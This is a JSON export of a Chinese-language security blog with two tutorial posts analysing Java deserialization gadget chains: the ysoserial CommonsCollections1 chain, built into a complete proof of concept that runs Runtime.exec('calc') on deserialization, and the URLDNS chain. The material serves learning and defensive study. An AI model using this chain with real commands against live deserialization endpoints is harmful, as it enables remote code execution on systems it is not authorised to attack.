{"meta":{"title":"self_209'blog","subtitle":"","description":"","author":"self_209","url":"https://self209.github.io","root":"/"},"pages":[{"title":"all-categories","date":"2021-12-25T10:13:54.918Z","updated":"2021-12-25T10:13:54.918Z","comments":false,"path":"all-categories/index.html","permalink":"https://self209.github.io/all-categories/index.html","excerpt":"","text":""},{"title":"all-tags","date":"2021-12-25T10:15:46.692Z","updated":"2021-12-25T10:15:46.692Z","comments":false,"path":"all-tags/index.html","permalink":"https://self209.github.io/all-tags/index.html","excerpt":"","text":""},{"title":"all-archives","date":"2021-12-25T10:16:57.727Z","updated":"2021-12-25T10:16:57.727Z","comments":false,"path":"all-archives/index.html","permalink":"https://self209.github.io/all-archives/index.html","excerpt":"","text":""}],"posts":[{"title":"java反序列化Commons Collections(一)","slug":"20211228","date":"2021-12-28T07:34:26.000Z","updated":"2021-12-29T10:26:27.656Z","comments":false,"path":"2021/12/28/20211228/","link":"","permalink":"https://self209.github.io/2021/12/28/20211228/","excerpt":"本文通过分析ysoserial工具中的CommonsCollections1 Gadget chain，复现漏洞，来学习Commons Collections反序列化漏洞。","text":"本文通过分析ysoserial工具中的CommonsCollections1 Gadget chain，复现漏洞，来学习Commons Collections反序列化漏洞。 漏洞环境： java：Java SE 8 Development Kit 8u65 commons-collections：3.2.1 gradle：implementation group: ‘commons-collections’, name: ‘commons-collections’, version: ‘3.2.1’ ysoserial Gadget chain： 12345678910111213141516ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() 执行类InvokerTransformer.transform()InvokerTransformer.transform() 12345678910111213141516171819202122232425262728293031323334353637public class InvokerTransformer implements Transformer, Serializable &#123; /** The method name to call */ private final String iMethodName; /** The array of reflection parameter types */ private final Class[] iParamTypes; /** The array of reflection arguments */ private final Object[] iArgs; public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; &#125; public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex); &#125; &#125; &#125; 直接来看关键代码，这里使用反射调用方法，并且传递的参数都可控。transform接收一个对象input，获取input对象的Class对象赋值到cls，获取cls对象的方法，通过invoke调用，iMethodName，iParamTypes，iArgs都可以通过构造函数传递。 123Class cls = input.getClass();Method method = cls.getMethod(iMethodName, iParamTypes);return method.invoke(input, iArgs); 既然都是可控的，那我们就利用InvokerTransformer.transform()来执行命令调用计算器试试。 1234567//首先获取一个Runtime对象Runtime R = Runtime.getRuntime();//尝试使用InvokerTransformer.transform()来执行命令调用计算器//1、new一个InvokerTransformer对象将Runtime的exec方法,参数类型，通过构造函数传递进去。InvokerTransformer invokerTransformer =new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);//2、调用transform方法，将Runtime对象R传递进去。invokerTransformer.transform(R); 运行代码： Gadget chain现在执行类已经有了，接下来就要找调用链了，从ysoserial工具的Gadget chain来看，它找了两个与执行类危险方法不同类相同名的方法作为ConstantTransformer.transform()，ChainedTransformer.transform() ConstantTransformer.transform()12345678910111213141516171819202122232425262728public class ConstantTransformer implements Transformer, Serializable &#123; /** The closures to call in turn */ private final Object iConstant; /** * Constructor that performs no validation. * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that. * * @param constantToReturn the constant to return each time */ public ConstantTransformer(Object constantToReturn) &#123; super(); iConstant = constantToReturn; &#125; /** * Transforms the input by ignoring it and returning the stored constant instead. * * @param input the input object which is ignored * @return the stored constant */ public Object transform(Object input) &#123; return iConstant; &#125;&#125; ConstantTransformer.transform()方法是接收一个对象input，返回一个对象iConstant，iConstant可以通过构造函数控制。 ChainedTransformer.transform()1234567891011121314151617181920212223242526272829303132public class ChainedTransformer implements Transformer, Serializable &#123; /** The transformers to call in turn */ private final Transformer[] iTransformers; /** * Constructor that performs no validation. * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that. * * @param transformers the transformers to chain, not copied, no nulls */ public ChainedTransformer(Transformer[] transformers) &#123; super(); iTransformers = transformers; &#125; /** * Transforms the input to result via each decorated transformer * * @param object the input object passed to the first transformer * @return the transformed result */ public Object transform(Object object) &#123; for (int i = 0; i &lt; iTransformers.length; i++) &#123; object = iTransformers[i].transform(object); &#125; return object; &#125; ChainedTransformer.transform()方法是接收一个对象，然后遍历调用iTransformers数组内，对象的transform方法，并且将返回值传递给下一个调用transform方法的对象。 刚开始接触这两个方法，从功能上来看一个返回固定对象(这个对象可控)，一个类似于链式调用，并不清楚这两个方法在Gadget chain起什么作用，没关系我们先按照上一篇文章所讲的寻找Gadget chain的方法来寻找与执行类相连的类。 在LazyMap类下的get方法调用了factory.transform(key)。 LazyMap.get()123456789101112131415161718192021222324public class LazyMap extends AbstractMapDecorator implements Map, Serializable &#123; public static Map decorate(Map map, Transformer factory) &#123; return new LazyMap(map, factory); &#125; protected LazyMap(Map map, Transformer factory) &#123; super(map); if (factory == null) &#123; throw new IllegalArgumentException(&quot;Factory must not be null&quot;); &#125; this.factory = factory; &#125; public Object get(Object key) &#123; // create value for key if key is not currently in the map if (map.containsKey(key) == false) &#123; Object value = factory.transform(key); map.put(key, value); return value; &#125; return map.get(key); &#125; &#125; get方法接收一个对象key，然后判断是否包含指定的键，false的话就会调用factory.transform(key)。看看factory是否可控，发现可以通过构造函数传递，但是并不能直接new，需要通过静态方法decorate()，factory的类型是Transformer，InvokerTransformer实现了Transformer接口，所以可以将InvokerTransformer对象传递给factory，那么当我们调用get方法并且传递一个Runtime对象时不就又实现invokerTransformer.transform(R);了。上代码 12345678910//首先获取一个Runtime对象Runtime R = Runtime.getRuntime();//尝试使用InvokerTransformer.transform()来执行命令调用计算器//1、new一个InvokerTransformer对象将Runtime的exec方法,参数类型，通过构造函数传递进去。类型改为Transformer，decorate要什么参数类型我们最好就传什么类型。Transformer invokerTransformer =new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);//2、decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key);Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;();//3、调用decorate静态方法构造LazyMap对象，它返回Map类型。Map&lt;Object,Object&gt; r = LazyMap.decorate(map,invokerTransformer);r.get(R); 运行代码： 接下来就是找什么地方调用了get方法，ysoserial Gadget chain中是在AnnotationInvocationHandler类下的invoke方法中调用了get，AnnotationInvocationHandler是动态代理类，invoke方法是当proxy代理对象调用方法时自动调用的。这里需要对动态代理有一定的理解 AnnotationInvocationHandler.invoke()12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123; private final Map&lt;String, Object&gt; memberValues; AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123; Class&lt;?&gt;[] superInterfaces = type.getInterfaces(); if (!type.isAnnotation() || superInterfaces.length != 1 || superInterfaces[0] != java.lang.annotation.Annotation.class) throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;); this.type = type; this.memberValues = memberValues; &#125; public Object invoke(Object proxy, Method method, Object[] args) &#123; String member = method.getName(); Class&lt;?&gt;[] paramTypes = method.getParameterTypes(); // Handle Object and Annotation methods if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp; paramTypes[0] == Object.class) return equalsImpl(args[0]); if (paramTypes.length != 0) throw new AssertionError(&quot;Too many parameters for an annotation method&quot;); switch(member) &#123; case &quot;toString&quot;: return toStringImpl(); case &quot;hashCode&quot;: return hashCodeImpl(); case &quot;annotationType&quot;: return type; &#125; // Handle annotation member accessors Object result = memberValues.get(member); if (result == null) throw new IncompleteAnnotationException(type, member); if (result instanceof ExceptionProxy) throw ((ExceptionProxy) result).generateException(); if (result.getClass().isArray() &amp;&amp; Array.getLength(result) != 0) result = cloneArray(result); return result; &#125; private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try &#123; annotationType = AnnotationType.getInstance(type); &#125; catch(IllegalArgumentException e) &#123; // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;); &#125; Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember( annotationType.members().get(name))); &#125; &#125; &#125; &#125; &#125; 在AnnotationInvocationHandler类下的invoke方法中调用了memberValues.get()方法，memberValues是构造方法传递的一个Map对象是可控的，而调用decorate静态方法构造的LazyMap对象，它刚好返回Map类型。 那我们现在就要考虑如何调用到memberValues.get(member)方法，首先他会获取proxy代理对象调用方法的方法名,如果调用equals就会进入第一个if，并且当你调用有参方法时就会进入第二个if报错，也就是说我们的proxy代理对象需要调用一个无参方法，才会调用到memberValues.get(member);，无参方法这个应该可以找到，那我们再看看member，他是一个String类型，是获取proxy代理对象调用方法的方法名，而根据前面的链LazyMap.get(Runtime对象)，我们需要接收的是一个Runtime对象,这就陷入了僵局。 山穷水尽疑无路，柳暗花明又一村我们来回顾一下调用链需要满足的条件： 调用链所以类都要实现Serializable 调用链的传递类型要相同 现在有两个问题： Runtime类不能序列化。 memberValues.get(member)，member类型不一致。 遇到问题不要慌，把问题列出来一个一个想办法解决。 这就是为什么前面会出现ChainedTransformer.transform()，ConstantTransformer.transform()这两个类的原因，这两个类的transform方法完美解决了上面的类型不一致问题，可以说是全场最佳。下面就来看看这两个类是如何解决上面这两个问题的。 我们先来解决Runtime类不能序列化。 将Runtime类转为可序列化形式Runtime类 123456789101112public class Runtime &#123; public static Runtime getRuntime() &#123; return currentRuntime; &#125; private Runtime() &#123;&#125; public Process exec(String command) throws IOException &#123; return exec(command, null, null); &#125; &#125; Runtime类没有实现Serializable接口，无法序列化，Class类实现了Serializable接口，所以我们就可以运用反射机制，调用exec方法，这里要注意，Runtime类的构造方法需要通过静态方法getRuntime调用，所以我们需要先获取Runtime类getRuntime方法，再invoke调用getRuntime获取Runtime对象，再获取Runtime类的exec方法，最后调用exec方法。 12345678910//获取Runtime类的Class 对象Class C = Runtime.class;//获取getRuntime方法Method getRuntimeMethod = C.getMethod(&quot;getRuntime&quot;,null);//invoke调用getRuntimeMethod方法，获取Runtime对象。getRuntime是无参静态方法，所以传递两个null就行，返回值是一个Object类型，我们把他强转为getRuntimeRuntime r = (Runtime) getRuntimeMethod.invoke(null,null);//获取Runtime类的exec方法Method execMethod = C.getMethod(&quot;exec&quot;,String.class);//调用exec方法execMethod.invoke(r,&quot;calc&quot;); 运行代码： 再将其转换为InvokerTransformer的形式， 1234Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r); 代码执行： InvokerTransformer形式的Runtime调用不就跟链式调用一样，先传一个Runtime.class到InvokerTransformer的transform方法中，返回一个Method getRuntimeMethod对象，再把Method getRuntimeMethod对象传到下一个InvokerTransformer的transform方法中，返回一个Runtime r对象，再把Runtime r对象传到下一个InvokerTransformer的transform方法中，实现计算器调用。这是不是和前面提到的ChainedTransformer.transform()方法，遍历调用iTransformers数组内，对象的transform方法，并且将返回值传递给下一个调用transform方法的对象，完美契合。 通过ChainedTransformer.transform()方法实现Runtime.getRuntime().exec()1234567Transformer[] transformers = new Transformer[]&#123; new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;) &#125;; new ChainedTransformer(transformers).transform(Runtime.class); 代码执行： 解决member类型不一致现在，Runtime类不能序列化的问题解决了，再来看看member类型不一致问题，想象一下，当LazyMap通过构造函数赋值给memberValues，那么memberValues.get(member)调用的就是LazyMap.get(key)，member就传递到了key，调用LazyMap.get(key)，因为通过LazyMap.decorate(map,invokerTransformer)将invokerTransformer赋值给了factory，factory.transform(key)就相当于调用ChainedTransformer.transform()，key就传递到了object，但是member是String类型，而ChainedTransformer.transform需要接收一个Runtime.class才能执行代码。前面提到ConstantTransformer.transform()方法是接收一个对象input，不管接收的input是什么对象，都返回一个iConstant对象，iConstant可以通过构造函数控制。那我们是不是可以合理运用一下把Runtime.class通过ConstantTransformer的构造函数传递给iConstant，这样当String类型传递到ChainedTransformer.transform方法后，调用ConstantTransformer.transform()把iConstant返回给下一个InvokerTransformer的transform方法，形成了一个替换。 ConstantTransformer.transform() 12345678910111213141516171819202122232425262728public class ConstantTransformer implements Transformer, Serializable &#123; /** The closures to call in turn */ private final Object iConstant; /** * Constructor that performs no validation. * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that. * * @param constantToReturn the constant to return each time */ public ConstantTransformer(Object constantToReturn) &#123; super(); iConstant = constantToReturn; &#125; /** * Transforms the input by ignoring it and returning the stored constant instead. * * @param input the input object which is ignored * @return the stored constant */ public Object transform(Object input) &#123; return iConstant; &#125;&#125; 直接上代码 12345678910111213141516//new 一个Transformer[]数组，将InvokerTransformer对象传递进去，形成链式调用。ConstantTransformer对象负责把String类型换成Runtime.classTransformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;) &#125;;//new 一个ChainedTransformer对象Transformer chainedTransformer = (Transformer) new ChainedTransformer(transformers);//decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key);Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;();//调用decorate静态方法构造LazyMap对象，它返回Map类型。Map&lt;Object,Object&gt; r = LazyMap.decorate(map,chainedTransformer);//定义一个String类型的变量，模拟一下String member = &quot;member&quot;;r.get(member); 运行代码： Map(Proxy).entrySet()遇到的问题都解决了，那我们接着找调用链，invoke方法是当proxy代理对象调用任意方法时自动调用的，并且得是无参方法才能调用memberValues.get(member)，那我们就得先获取InvocationHandler对象，再创建proxy代理对象，AnnotationInvocationHandler是私有类，所以需要通过反射获取AnnotationInvocationHandler Class对象，再获取构造方法，再构造InvocationHandler对象。 1234567891011 //获取AnnotationInvocationHandler Class对象Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);//获取构造方法Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class);//设置访问权限AnnotationInvocationHandlerConstructor.setAccessible(true);//InvocationHandler 对象InvocationHandler invocationHandler = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Override.class,r);//创建代理对象Map proxyMap = (Map) Proxy.newProxyInstance(r.getClass().getClassLoader(),r.getClass().getInterfaces(),invocationHandler); proxyMap对象调用任意方法的时候，就会去调用invocationHandler对象的invoke方法，那么我们就要想办法找一个可以传递Map类型对象的类，并且还得有无参方法。 入口类AnnotationInvocationHandler.readObject()AnnotationInvocationHandler类重写了readObject方法，并且readObject方法调用了memberValues.entrySet()无参方法，memberValues是Map类型，可以通过构造方法控制，那我们是不是可以将proxyMap通过构造方法传递给memberValues，构造一个InvocationHandler对象ooo，当反序列化ooo对象时，调用readObject()，memberValues是proxyMap对象，当代码执行到memberValues.entrySet()时，就是调用proxyMap.entrySet()，就会触发invocationHandler对象invoke方法，invocationHandler对象的memberValues等于r ，当调用到memberValues.get(member)时，就是调用r.get(member)这样就把整条链连接起来了。 最后完整的调用链代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.reflect.*;import java.net.URL;import java.util.HashMap;import java.util.Map;public class cc1Serialize &#123; public static void Serialize(Object object) throws IOException &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ooo.txt&quot;)); oos.writeObject(object); &#125; public static Object unSerialize(String FileName) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(FileName)); return ois.readObject(); &#125; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, ClassNotFoundException, InstantiationException &#123; //new 一个Transformer[]数组，将InvokerTransformer对象传递进去，形成链式调用。 Transformer[] transformers = new Transformer[]&#123; //ConstantTransformer对象负责把String类型换成Runtime.class new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;) &#125;; //new 一个ChainedTransformer对象传递一个Transformer[]数组循环调用对象的transform方法 Transformer chainedTransformer = (Transformer) new ChainedTransformer(transformers); //decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key); Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;(); //调用decorate静态方法构造LazyMap对象，它返回Map类型。 Map&lt;Object,Object&gt; r = LazyMap.decorate(map,chainedTransformer); //获取AnnotationInvocationHandler Class对象 Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); //获取构造方法 Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); //设置访问权限 AnnotationInvocationHandlerConstructor.setAccessible(true); //InvocationHandler 对象 InvocationHandler invocationHandler = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Override.class,r); //创建代理对象 Map proxyMap = (Map) Proxy.newProxyInstance(r.getClass().getClassLoader(),r.getClass().getInterfaces(),invocationHandler); //将proxyMap通过构造方法传递给memberValues，构造一个InvocationHandler对象ooo InvocationHandler ooo = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Override.class,proxyMap); &#125;&#125; 序列化ooo对象： 反序列化ooo对象：","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://self209.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java","slug":"java","permalink":"https://self209.github.io/tags/java/"}]},{"title":"java反序列化URLDNS","slug":"20211226","date":"2021-12-26T01:34:26.000Z","updated":"2021-12-28T15:16:37.294Z","comments":false,"path":"2021/12/26/20211226/","link":"","permalink":"https://self209.github.io/2021/12/26/20211226/","excerpt":"初次接触java反序列化漏洞，通过分析ysoserial工具中的payload，复现漏洞，来学习java反序列化漏洞。本文先从最简单的URLDNS Gadget chain开始java反序列化篇章。","text":"初次接触java反序列化漏洞，通过分析ysoserial工具中的payload，复现漏洞，来学习java反序列化漏洞。本文先从最简单的URLDNS Gadget chain开始java反序列化篇章。 java原生反序列化JDK类库中的序列化API java.io.ObjectOutputStream代表对象输出流，它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。 java.io.ObjectInputStream代表对象输入流，它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。 只有实现了Serializable和Externalizable接口的类的对象才能被序列化。Externalizable接口继承自 Serializable接口，实现Externalizable接口的类完全由自身来控制序列化的行为，而仅实现Serializable接口的类可以 采用默认的序列化方式 。 对象序列化包括如下步骤： 创建一个对象输出流，它可以包装一个其他类型的目标输出流，如文件输出流； 通过对象输出流的writeObject()方法写对象。 对象反序列化的步骤如下： 创建一个对象输入流，它可以包装一个其他类型的源输入流，如文件输入流； 通过对象输入流的readObject()方法读取对象。 例： 定义一个Student类，实现Serializable接口 123456789101112131415161718192021222324252627282930313233343536373839404142import java.io.Serializable;public class Student implements Serializable &#123; private int age; private String name; private String sex; public Student()&#123; &#125; public Student(String name,int age,String sex)&#123; this.age = age; this.name = name; this.sex = sex; &#125; public int getAge() &#123; return age; &#125; public String getName() &#123; return name; &#125; public String getSex() &#123; return sex; &#125; public void setAge(int age) &#123; this.age = age; &#125; public void setName(String name) &#123; this.name = name; &#125; public void setSex(String sex) &#123; this.sex = sex; &#125;&#125; 序列化和反序列化Student类对象 123456789101112131415161718192021222324252627282930313233343536373839import java.io.File;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.text.MessageFormat;public class SerializeAndDeserialize &#123; public static void main(String[] args) throws Exception &#123; SerializeStudent();//序列化Student对象 Student s = DeserializeStudent();//反序列Student对象 System.out.println(MessageFormat.format(&quot;name=&#123;0&#125;,age=&#123;1&#125;,sex=&#123;2&#125;&quot;, s.getName(), s.getAge(), s.getSex())); &#125; private static void SerializeStudent() throws FileNotFoundException,IOException &#123; Student student = new Student(&quot;zhangsan&quot;,18,&quot;男&quot;); // ObjectOutputStream 对象输出流，将Student对象存储为Student.txt文件中，完成对Student对象的序列化操作 ObjectOutputStream oo = new ObjectOutputStream(new FileOutputStream(new File(&quot;Student.txt&quot;))); oo.writeObject(student); System.out.println(&quot;Student对象序列化成功！&quot;); oo.close(); &#125; private static Student DeserializeStudent() throws Exception, IOException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream( new File(&quot;Student.txt&quot;))); Student student = (Student) ois.readObject(); System.out.println(&quot;Student对象反序列化成功！&quot;); return student; &#125;&#125; 代码运行结果如下： 反序列化漏洞形成的必要条件漏洞的形成需要找到如下三个条件相关的类，并且都得实现了Serializable接口。 执行类(风险方法类) sink 调用链 gadget chain 入口类 source 1、执行类 存在风险方法，并且传递参数可控 比如： 反射调用参数可控(RCE、SSRF) Runtime类的相关方法(RCE) URL类的相关方法(SSRF) …… 2、调用链 调用链就是将执行类的风险方法与入口类的readObject方法中调用的方法关联或者说联系在一起的一个或多个类的方法，与执行类的风险方法相连接的链，必须是同类型或者说类型宽泛，方法名相同与否都可以，但是方法内必须调用与执行类的风险方法同名，以此类推直至找到与入口类的readObject方法中调用的方法同名的方法，调用链才算完成。 这个解释看不懂没关系，后面在如何寻找gadget chain中会作详细解释。 3、入口类 入口类首先得重写readObject方法，类型越宽泛越好 。例如：HashMap 如何寻找gadget chain这里结合流程图对寻找gadget chain作详细解释，以第一个链为例，后面的链都是一个道理。 假设这里有一个命令执行风险类A,其中的a方法存在命令执行风险(这里不探究具体代码,只是理解调用链的链接方式) 现在我们要找它的第一个链，现在有三个选择 同类不同名方法调用了a() 不同类同名方法调用了a() 不同类不同名方法调用了a() 当我们选择同类不同名方法调用了a()时，需要考虑的是参数ghi是否可控。 当我们选择不同类同名方法调用了a()时，需要考虑的是Abc与Ghi是否是同类型，x2可否控制或者说可不可以通过其他方式控制。 当我们选择不同类不同名方法调用了a()，需要考虑的是Def与Ghi是否是同类型，x1可否控制或者说可不可以通过其他方式控制。 往后的链都是一个道理，直至找到与入口类的readObject方法中，调用的方法同名的方法。 比如：HashMap.readObject()中调用了hash()，那么我们的链找到hash()方法就可以，当然具体能不能用还是要看参数是否可控。 URLDNS Gadget Chain12345ysoserial Gadget Chain: HashMap.readObject()//入口类 HashMap.putVal() HashMap.hash() URL.hashCode() //执行类 从ysoserial工具的payload来看，执行类是URL的hashCode方法，那我们就跟进去URL类去看看。 URL类 123456789 private int hashCode = -1; public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; &#125; hashCode默认等于-1，那么就会调用handler.hashCode(this); 跟进到handler.hashCode(); 调用handler.hashCode();传入一个URL对象，会调用getHostAddress方法，根据注释Get the IP address of our host.获取主机ip地址，会向host发送请求。 123456789101112131415161718192021222324252627/** * Get the IP address of our host. An empty host field or a DNS failure * will result in a null return. * * @param u a URL object * @return an &#123;@code InetAddress&#125; representing the host * IP address. * @since 1.3 */ protected synchronized InetAddress getHostAddress(URL u) &#123; if (u.hostAddress != null) return u.hostAddress; String host = u.getHost(); if (host == null || host.equals(&quot;&quot;)) &#123; return null; &#125; else &#123; try &#123; u.hostAddress = InetAddress.getByName(host); &#125; catch (UnknownHostException ex) &#123; return null; &#125; catch (SecurityException se) &#123; return null; &#125; &#125; return u.hostAddress; &#125; 好的，现在执行类已经有了，URL.hashCode()。下面开始找调用链，直接搜索hashCode。 嗯。漂亮，1291处这里就不一个一个看了，我们就直接来看payload的Gadget Chain。HashMap.hash() 这里不就是上面所说的，不同类不同名方法调用了hashCode()，我们只需要看是否是同类型，参数是否可控。这里一个类型Object，一个URL，万物皆Object，符合。但是key并不清楚能否控制，接着往下找。 接下来找那些类调用了hash()，不多，有24处，可以稍微看一下。 直接找到了入口类 HashMap.readObject()， 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/** * Reconstitutes this map from a stream (that is, deserializes it). * @param s the stream * @throws ClassNotFoundException if the class of a serialized object * could not be found * @throws IOException if an I/O error occurs */private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize(); if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) throw new InvalidObjectException(&quot;Illegal load factor: &quot; + loadFactor); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings &lt; 0) throw new InvalidObjectException(&quot;Illegal mappings count: &quot; + mappings); else if (mappings &gt; 0) &#123; // (if zero, use defaults) // Size the table using given load factor only if within // range of 0.25...4.0 float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f); float fc = (float)mappings / lf + 1.0f; int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); // Check Map.Entry[].class since it&#x27;s the nearest public type to // what we&#x27;re actually creating. SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap); @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;) Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false);//调用hash(key) &#125; &#125;&#125; 在最后的for循环中调用了hash()，传递了参数key，而key就是将集合的泛型K反序列化后的对象，HashMap的泛型K,V都是可以控制。那么我们来捋一下Gadget Chain。 12345678910111213141516Gadget Chain： HashMap.readObject()&#123; hash(key) &#125; HashMap.hash(Object,key)&#123; key.hashCode() &#125; URL.hashCode()&#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; &#125; hashCode(URL u) &#123; getHostAddress(u); &#125; 